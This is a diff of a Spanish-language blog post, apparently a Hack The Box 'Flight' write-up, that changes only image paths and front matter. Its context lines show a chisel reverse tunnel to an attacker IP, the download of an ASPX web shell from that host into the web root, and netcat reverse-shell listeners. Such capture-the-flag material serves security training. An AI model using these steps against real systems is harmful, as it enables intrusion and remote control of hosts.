@@ -1,10 +1,10 @@
 ---
 layout: post
-author: 4akatun
+title: Flight Hackthebox
 ---
 
 # Writeup
-![Flight](/assets/img/Flight/Flight.png)
+![Flight]({{'/assets/img/Flight/Flight.png' | relative_url}})
 
 HACK-THE-BOX
 
@@ -78,7 +78,7 @@ Host script results:
 ```
 Visitamos la pagina Web para analizarla.
 
-![imangen web](/assets/img/Flight/flight_htb.png)
+![imangen web]({{'/assets/img/Flight/flight_htb.png' | relative_url}})
 
 Observamos un nombre de dominio que tendremos que añadir en **/etc/hosts**
 
@@ -102,7 +102,7 @@ ID           Response   Lines    Word       Chars       Payload
 ```
 Compruevo y tengo trazabilidad con mi maquina enviando una petecion a nuestra maquina y escuchando con ***tcpdump***.
 
-![test](/assets/img/Flight/test.png)
+![test]({{'/assets/img/Flight/test.png' | relative_url}})
 
 ```bash
 ❯ tcpdump -i tun0
@@ -416,7 +416,7 @@ smb: \flight.htb\>
 
 Para obertener la **rever-shell** podemo visitar [rev-shell](https://www.revshells.com/)
 
-![web-shell](assets/img/Flight/web-shell.png)
+![web-shell]({{'assets/img/Flight/web-shell.png' | relative_url}})
 
 Nos ponemos en escucha en nuestro equipo con **netcat** en el puerto que queramos.
 
@@ -568,7 +568,7 @@ PS C:\users\c.bum\desktop> .\chisel.exe client 10.10.14.12:1234 R:8000:127.0.0.1
 
 Despues de conctarme a la web veo que esta escrito en **ASP .NET** provare a cargar una **shell .aspx** y conectarme.
 
-![img](assets/img/Flight/chisel-web.png)
+![img]({{'assets/img/Flight/chisel-web.png' | relative_url}})
 
 ```bash
 cPS C:\users\c.bum\desktop> url 10.10.14.12/cmd.aspx -o cmd.aspx
@@ -590,7 +590,7 @@ PS C:\users\c.bum\desktop> copy cmd.aspx C:\inetpub\development
 ```
 Tranferimos el archivo a la maquina victima y lo copiasmos en la ruta indicada 'la maquina lo borra y conviene tenerlo a mano'.
 
-![img](assets/img/Flight/aspx.png)
+![img]({{'assets/img/Flight/aspx.png' | relative_url}})
 
 ```bash
 ❯ rlwrap nc -nlvp 443
